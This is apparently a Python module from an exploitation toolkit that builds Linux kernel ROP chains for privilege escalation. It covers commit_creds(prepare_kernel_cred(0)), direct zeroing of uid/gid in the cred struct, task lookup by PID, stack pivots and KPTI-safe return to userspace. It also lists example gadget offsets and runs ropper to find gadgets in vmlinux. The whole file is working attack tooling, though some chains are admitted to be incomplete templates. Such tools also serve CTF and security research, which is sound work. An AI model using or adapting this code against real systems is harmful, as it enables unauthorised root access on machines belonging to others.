"""
Kernel ROP chain building.

Builds ROP chains for:
- Privilege escalation (commit_creds/prepare_kernel_cred)
- Credential manipulation (direct cred struct modification)
- Return to userspace (KPTI bypass, swapgs)
- Stack pivoting
"""

import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from supwngo.kernel.symbols import KernelSymbols
from supwngo.utils.helpers import p64
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class KernelGadget:
    """Represents a kernel ROP gadget."""
    address: int
    instructions: str
    offset: int = 0  # Offset from kernel base

    def __str__(self) -> str:
        return f"0x{self.address:x}: {self.instructions}"


@dataclass
class KernelROPChain:
    """Represents a kernel ROP chain."""
    gadgets: List[Tuple[int, str]] = field(default_factory=list)
    description: str = ""

    def add(self, addr: int, desc: str = "") -> "KernelROPChain":
        self.gadgets.append((addr, desc))
        return self

    def build(self) -> bytes:
        return b"".join(p64(addr) for addr, _ in self.gadgets)

    def __bytes__(self) -> bytes:
        return self.build()

    def __str__(self) -> str:
        lines = [f"Kernel ROP Chain: {self.description}"]
        for addr, desc in self.gadgets:
            lines.append(f"  0x{addr:016x}  {desc}")
        return "\n".join(lines)


class KernelROPBuilder:
    """
    Build ROP chains for kernel exploitation.

    Supports multiple privilege escalation techniques:
    1. commit_creds(prepare_kernel_cred(0))
    2. Direct cred struct modification
    3. modprobe_path overwrite
    """

    # Common kernel gadget patterns (offsets relative to kernel base)
    # These need to be customized per kernel version
    COMMON_GADGETS = {
        # Stack pivot gadgets
        "mov_esp_pivot": {
            "pattern": "mov esp, 0x[0-9a-f]+000000",
            "example_offset": 0x311655,  # mov esp, 0xf6000000; ret
        },
        "xchg_rax_rsp": {
            "pattern": "xchg rax, rsp",
            "example_offset": 0x74bfb1,
        },

        # Pop gadgets
        "pop_rdi": {"example_offset": 0x8e2f0},
        "pop_rsi": {"example_offset": 0x13acbe},
        "pop_rdx": {"example_offset": 0x145369},
        "pop_rax": {"example_offset": 0x4d11f},
        "pop_rcx": {"example_offset": 0x15e93c},
        "pop_rbp": {"example_offset": 0x54b6d},

        # Memory gadgets
        "mov_rax_qword_ptr_rax": {"example_offset": 0x129174},  # mov rax, [rax]; ret
        "mov_qword_ptr_rax_0": {"example_offset": 0x4a5738},    # mov qword ptr [rax], 0; ret
        "add_rax_rdi": {"example_offset": 0x3ba2e},            # add rax, rdi; ret

        # Control flow
        "ret": {"example_offset": 0x8e2f1},
        "leave_ret": {"example_offset": 0x5497e},
    }

    def __init__(
        self,
        symbols: KernelSymbols,
        gadgets: Optional[Dict[str, int]] = None,
    ):
        """
        Initialize kernel ROP builder.

        Args:
            symbols: Kernel symbols for address resolution
            gadgets: Dict of gadget_name -> offset from kernel base
        """
        self.symbols = symbols
        self.kernel_base = symbols.kernel_base

        # Initialize gadgets
        self.gadgets: Dict[str, int] = {}
        if gadgets:
            for name, offset in gadgets.items():
                self.gadgets[name] = self.kernel_base + offset

    @classmethod
    def from_vmlinux(cls, vmlinux_path: str, symbols: KernelSymbols) -> "KernelROPBuilder":
        """
        Create builder with gadgets found in vmlinux.

        Args:
            vmlinux_path: Path to vmlinux binary
            symbols: KernelSymbols instance

        Returns:
            Configured KernelROPBuilder
        """
        builder = cls(symbols)
        builder._find_gadgets_ropper(vmlinux_path)
        return builder

    def _find_gadgets_ropper(self, vmlinux_path: str) -> None:
        """Find gadgets using ropper."""
        try:
            # Find specific useful gadgets
            gadget_patterns = [
                ("pop_rdi", "pop rdi"),
                ("pop_rsi", "pop rsi"),
                ("pop_rdx", "pop rdx"),
                ("pop_rax", "pop rax"),
                ("pop_rcx", "pop rcx"),
                ("pop_rbp", "pop rbp"),
                ("ret", "ret"),
            ]

            result = subprocess.run(
                ["ropper", "--file", vmlinux_path, "--nocolor"],
                capture_output=True,
                text=True,
                timeout=300,
            )

            for name, pattern in gadget_patterns:
                for line in result.stdout.split('\n'):
                    if pattern in line.lower() and "ret" in line.lower():
                        # Extract address
                        import re
                        match = re.match(r'(0x[0-9a-f]+)', line.strip())
                        if match:
                            addr = int(match.group(1), 16)
                            self.gadgets[name] = addr
                            break

        except Exception as e:
            logger.warning(f"ropper gadget search failed: {e}")

    def set_gadget(self, name: str, offset: int) -> None:
        """Set gadget by offset from kernel base."""
        self.gadgets[name] = self.kernel_base + offset

    def get_gadget(self, name: str) -> int:
        """Get gadget address."""
        if name not in self.gadgets:
            raise KeyError(f"Gadget not found: {name}")
        return self.gadgets[name]

    def build_commit_creds_chain(self) -> Optional[KernelROPChain]:
        """
        Build commit_creds(prepare_kernel_cred(0)) chain.

        This is the classic kernel privilege escalation.

        Returns:
            KernelROPChain or None
        """
        chain = KernelROPChain(description="commit_creds(prepare_kernel_cred(0))")

        try:
            pop_rdi = self.get_gadget("pop_rdi")
            prepare_kernel_cred = self.symbols.resolve("prepare_kernel_cred")
            commit_creds = self.symbols.resolve("commit_creds")

            # pop rdi; ret
            chain.add(pop_rdi, "pop rdi; ret")
            # 0 (for prepare_kernel_cred(0))
            chain.add(0, "0 = NULL")
            # prepare_kernel_cred
            chain.add(prepare_kernel_cred, "prepare_kernel_cred")
            # Result in rax, need to move to rdi
            # This requires a mov rdi, rax gadget

            # Try to find mov rdi, rax or equivalent
            if "mov_rdi_rax" in self.gadgets:
                chain.add(self.get_gadget("mov_rdi_rax"), "mov rdi, rax")
            else:
                # Alternative: push rax; pop rdi; ret
                logger.warning("No mov rdi, rax gadget - chain may be incomplete")
                # Some kernels have xchg gadgets
                if "xchg_rdi_rax" in self.gadgets:
                    chain.add(self.get_gadget("xchg_rdi_rax"), "xchg rdi, rax")

            # commit_creds
            chain.add(commit_creds, "commit_creds")

            return chain

        except KeyError as e:
            logger.error(f"Missing gadget/symbol for commit_creds chain: {e}")
            return None

    def build_cred_overwrite_chain(
        self,
        task_addr: int,
        cred_offset: int = 0xa60,  # Varies by kernel
    ) -> Optional[KernelROPChain]:
        """
        Build chain to directly overwrite cred struct fields.

        This technique finds the task_struct and zeros out uid/gid fields.

        Args:
            task_addr: Address of target task_struct
            cred_offset: Offset of real_cred in task_struct

        Returns:
            KernelROPChain or None
        """
        chain = KernelROPChain(description="Direct credential overwrite")

        try:
            pop_rdi = self.get_gadget("pop_rdi")
            pop_rax = self.get_gadget("pop_rax")

            # This requires gadgets like:
            # mov rax, [rax] - dereference pointer
            # mov qword ptr [rax], 0 - zero out
            # add rax, rdi - arithmetic

            # The specific chain depends heavily on available gadgets
            # This is a template that needs customization

            # Get cred pointer from task_struct
            chain.add(pop_rax, "pop rax; ret")
            chain.add(task_addr + cred_offset, "task->real_cred address")

            if "mov_rax_qword_ptr_rax" in self.gadgets:
                chain.add(self.get_gadget("mov_rax_qword_ptr_rax"), "mov rax, [rax] ; dereference cred ptr")

            # Now rax = cred ptr, need to zero uid at offset +4
            chain.add(pop_rdi, "pop rdi; ret")
            chain.add(4, "uid offset in cred")

            if "add_rax_rdi" in self.gadgets:
                chain.add(self.get_gadget("add_rax_rdi"), "add rax, rdi; point to uid")

            if "mov_qword_ptr_rax_0" in self.gadgets:
                # Zero uid and gid (8 bytes)
                chain.add(self.get_gadget("mov_qword_ptr_rax_0"), "mov qword ptr [rax], 0 ; zero uid+gid")

            return chain

        except KeyError as e:
            logger.error(f"Missing gadget for cred overwrite: {e}")
            return None

    def build_find_task_chain(self, pid: int) -> Optional[KernelROPChain]:
        """
        Build chain to find task_struct by PID.

        Uses find_task_by_vpid(pid) which returns task_struct pointer.

        Args:
            pid: Target process PID

        Returns:
            KernelROPChain
        """
        chain = KernelROPChain(description=f"find_task_by_vpid({pid})")

        try:
            pop_rdi = self.get_gadget("pop_rdi")
            find_task = self.symbols.resolve("find_task_by_vpid")

            chain.add(pop_rdi, "pop rdi; ret")
            chain.add(pid, f"pid = {pid}")
            chain.add(find_task, "find_task_by_vpid")

            return chain

        except KeyError as e:
            logger.error(f"Missing gadget/symbol: {e}")
            return None

    def build_return_to_usermode_chain(
        self,
        user_rip: int,
        user_cs: int = 0x33,
        user_rflags: int = 0x246,
        user_rsp: int = 0,
        user_ss: int = 0x2b,
    ) -> Optional[KernelROPChain]:
        """
        Build chain to return to usermode (KPTI-safe).

        Uses swapgs_restore_regs_and_return_to_usermode trampoline.

        Args:
            user_rip: Userspace return address
            user_cs: User code segment
            user_rflags: User flags
            user_rsp: User stack pointer
            user_ss: User stack segment

        Returns:
            KernelROPChain
        """
        chain = KernelROPChain(description="Return to usermode")

        try:
            kpti_tramp = self.symbols.get_kpti_trampoline()
            if kpti_tramp:
                # KPTI trampoline expects iret frame on stack
                chain.add(kpti_tramp, "swapgs_restore_regs_and_return_to_usermode")
                chain.add(0, "dummy rbx")
                chain.add(0, "dummy r12")
                chain.add(0, "dummy rbp")
                chain.add(user_rip, "user_rip")
                chain.add(user_cs, "user_cs")
                chain.add(user_rflags, "user_rflags")
                chain.add(user_rsp, "user_rsp")
                chain.add(user_ss, "user_ss")
            else:
                # Manual swapgs; iretq
                if "swapgs" in self.gadgets:
                    chain.add(self.get_gadget("swapgs"), "swapgs")
                if "iretq" in self.gadgets:
                    chain.add(self.get_gadget("iretq"), "iretq")
                    chain.add(user_rip, "user_rip")
                    chain.add(user_cs, "user_cs")
                    chain.add(user_rflags, "user_rflags")
                    chain.add(user_rsp, "user_rsp")
                    chain.add(user_ss, "user_ss")

            return chain

        except Exception as e:
            logger.error(f"Failed to build return chain: {e}")
            return None

    def build_stack_pivot_chain(
        self,
        pivot_addr: int,
    ) -> Optional[KernelROPChain]:
        """
        Build stack pivot chain.

        Args:
            pivot_addr: Address to pivot stack to

        Returns:
            KernelROPChain
        """
        chain = KernelROPChain(description=f"Stack pivot to 0x{pivot_addr:x}")

        # Method 1: mov esp, VALUE gadget (truncates to 32-bit)
        if "mov_esp_pivot" in self.gadgets:
            chain.add(self.get_gadget("mov_esp_pivot"), "mov esp, pivot_value; ret")
            return chain

        # Method 2: pop rsp; ret
        if "pop_rsp" in self.gadgets:
            chain.add(self.get_gadget("pop_rsp"), "pop rsp; ret")
            chain.add(pivot_addr, f"new_rsp = 0x{pivot_addr:x}")
            return chain

        # Method 3: xchg rax, rsp
        if "xchg_rax_rsp" in self.gadgets and "pop_rax" in self.gadgets:
            chain.add(self.get_gadget("pop_rax"), "pop rax; ret")
            chain.add(pivot_addr, f"pivot_addr = 0x{pivot_addr:x}")
            chain.add(self.get_gadget("xchg_rax_rsp"), "xchg rax, rsp")
            return chain

        logger.warning("No suitable stack pivot gadgets found")
        return None

    def build_full_privesc_chain(
        self,
        pid: int,
        user_rip: int,
        user_rsp: int,
    ) -> Optional[bytes]:
        """
        Build complete privilege escalation chain.

        Combines:
        1. Find current task
        2. Overwrite credentials to root
        3. Return to userspace

        Args:
            pid: Target process PID
            user_rip: Return address in userspace
            user_rsp: Userspace stack pointer

        Returns:
            Complete ROP chain bytes
        """
        chains = []

        # Find task
        task_chain = self.build_find_task_chain(pid)
        if task_chain:
            chains.append(task_chain)

        # Note: Would need additional gadgets to:
        # 1. Save task pointer
        # 2. Compute cred address
        # 3. Zero out uid/gid

        # Return to usermode
        ret_chain = self.build_return_to_usermode_chain(user_rip, user_rsp=user_rsp)
        if ret_chain:
            chains.append(ret_chain)

        if not chains:
            return None

        # Combine chains
        result = b""
        for chain in chains:
            result += chain.build()

        return result

    def summary(self) -> str:
        """Get builder summary."""
        lines = [
            "Kernel ROP Builder",
            "=" * 40,
            f"Kernel base: 0x{self.kernel_base:x}",
            f"Gadgets loaded: {len(self.gadgets)}",
        ]

        if self.gadgets:
            lines.append("\nAvailable Gadgets:")
            for name, addr in sorted(self.gadgets.items()):
                lines.append(f"  {name}: 0x{addr:x}")

        return "\n".join(lines)
